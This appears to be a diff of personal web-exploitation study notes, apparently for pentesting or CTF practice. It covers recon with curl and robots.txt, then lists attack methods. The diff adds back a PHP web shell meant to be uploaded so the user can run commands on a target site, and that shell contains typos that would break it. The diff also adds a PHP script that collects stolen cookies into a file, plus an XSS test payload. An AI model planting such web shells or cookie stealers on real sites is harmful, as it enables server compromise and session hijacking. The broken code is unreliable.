@@ -58,23 +58,36 @@ curl: curl -o stuff.html https://web.site/stuff.html
 robots.txt: Shows you directories you may not know about -> http(s)://url/robots.txt
 
 Exploitation Methods: - Server-Side Injection: Really only gets you /etc/passwd and /etc/hosts files (could find next hop or box from these)
-                      - Malicious File Upload: 
-                        -FIle to upload: <HTML><BODY>
-                                         <FORM METHOD="GET" NAME="myform" ACTION="">
-                                         <INPUT TYPE="text" NAME="cmd">
-                                         <INPUT TYPE="submit" VALUE="Send">
-                                         </FORM>
-                                         <pre>
-                                         <?php
-                                         if($_GET['cmd"]) {
-                                           system($_GE['cmd']);
-                                           }
-                                         ?>
-                                         </pre>
-                                         </BODY></HTML>
-                      - Command Injection:
-                      - Directory Traversal
+                      - Malicious File Upload: Upload a file that allows you to inject cmds
+                        Code of file to upload: <HTML><BODY>         #This code should allow you to run cmds on their site
+                                                <FORM METHOD="GET" NAME="myform" ACTION="">
+                                                <INPUT TYPE="text" NAME="cmd">
+                                                <INPUT TYPE="submit" VALUE="Send">
+                                                </FORM>
+                                                <pre>
+                                                <?php
+                                                if($_GET['cmd"]) {
+                                                  system($_GE['cmd']);
+                                                  }
+                                                ?>
+                                                </pre>
+                                                </BODY></HTML>
+
+                      - Command Injection: Inject cmds to gain access to back-end
+                                           cmd to upload is in the pasta on linux
+                      - Directory Traversal:
                       - Cross-Site Scripting: <script>alert('meow');</script>  #Dont worry about this one
+Cookie Stealing (This will break the website): <?php
+                                               $cookie = $_GET["goodz"];
+                                               $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+                                               fwrite($steal, $cookie ."\n");
+                                               fclose($steal);
+                                               ?>
+
+
+
+
+
 
 
            
